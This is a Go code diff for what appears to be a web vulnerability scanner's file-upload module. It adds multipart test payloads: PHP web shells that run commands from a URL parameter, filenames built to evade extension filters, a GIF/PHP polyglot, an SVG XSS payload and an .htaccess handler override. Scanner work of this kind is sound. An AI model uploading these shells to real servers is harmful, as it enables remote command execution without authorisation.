@@ -48,8 +48,46 @@ func (m *UploadModule) GeneratePayloads(points []input.InjectionPoint, mode stri
 
 	for _, point := range points {
 		name := strings.ToLower(point.Name)
-		if strings.Contains(name, "file") || strings.Contains(name, "upload") ||
-			strings.Contains(name, "name") || strings.Contains(name, "attachment") {
+		isFileField := strings.Contains(name, "file") || strings.Contains(name, "upload") ||
+			strings.Contains(name, "attachment") || strings.Contains(name, "document") ||
+			strings.Contains(name, "avatar") || strings.Contains(name, "image")
+
+		// Real multipart/form-data uploads for file-like fields
+		if isFileField {
+			fileTests := []struct {
+				filename string
+				content  string
+				ctype    string
+				variant  string
+			}{
+				{"shell.php", "<?php system($_GET['c']); ?>", "application/x-php", "mp-php"},
+				{"shell.php.jpg", "<?php system($_GET['c']); ?>", "image/jpeg", "mp-double-ext"},
+				{"shell.jpg.php", "<?php system($_GET['c']); ?>", "image/jpeg", "mp-double-ext-rev"},
+				{"shell.phtml", "<?php system($_GET['c']); ?>", "application/octet-stream", "mp-phtml"},
+				{"shell.php%00.jpg", "<?php system($_GET['c']); ?>", "image/jpeg", "mp-nullbyte"},
+				{"x.svg", "<svg onload=alert(1)>", "image/svg+xml", "mp-svg-xss"},
+				{"gif.php", "GIF89a<?php system($_GET['c']); ?>", "image/gif", "mp-gif-polyglot"},
+				{".htaccess", "AddType application/x-httpd-php .jpg", "text/plain", "mp-htaccess"},
+			}
+			for _, ft := range fileTests {
+				payloads = append(payloads, mutator.Payload{
+					Value:   ft.filename,
+					Point:   point,
+					Module:  "upload",
+					Variant: ft.variant,
+					Metadata: map[string]string{
+						"upload":          "1",
+						"upload_field":    point.Name,
+						"upload_filename": ft.filename,
+						"upload_content":  ft.content,
+						"upload_ctype":    ft.ctype,
+					},
+				})
+			}
+		}
+
+		// Legacy: filename-as-value (for params that take a filename string)
+		if isFileField || strings.Contains(name, "name") {
 			for _, p := range uploadPayloads {
 				payloads = append(payloads, mutator.Payload{
 					Value: p.value, Point: point, Module: "upload", Variant: p.variant,
@@ -57,18 +95,12 @@ func (m *UploadModule) GeneratePayloads(points []input.InjectionPoint, mode stri
 			}
 		}
 		if strings.Contains(name, "content") || strings.Contains(name, "data") ||
-			strings.Contains(name, "body") || strings.Contains(name, "file") {
+			strings.Contains(name, "body") {
 			for _, p := range contentPayloads {
 				payloads = append(payloads, mutator.Payload{
 					Value: p.value, Point: point, Module: "upload", Variant: p.variant,
 				})
 			}
-		}
-		// Generic: test on all points
-		for _, p := range uploadPayloads {
-			payloads = append(payloads, mutator.Payload{
-				Value: p.value, Point: point, Module: "upload", Variant: p.variant,
-			})
 		}
 	}
 	return payloads
@@ -81,8 +113,8 @@ func (m *UploadModule) Detect(payload mutator.Payload, baseBody string, baseStat
 		return nil
 	}
 
-	// SVG XSS detection
-	if payload.Variant == "svg-xss" {
+	// SVG XSS detection (covers both legacy and multipart svg variants)
+	if payload.Variant == "svg-xss" || payload.Variant == "mp-svg-xss" {
 		if strings.Contains(respBody, "<svg") && strings.Contains(respBody, "onload") {
 			return &Finding{
 				Module:      "upload",
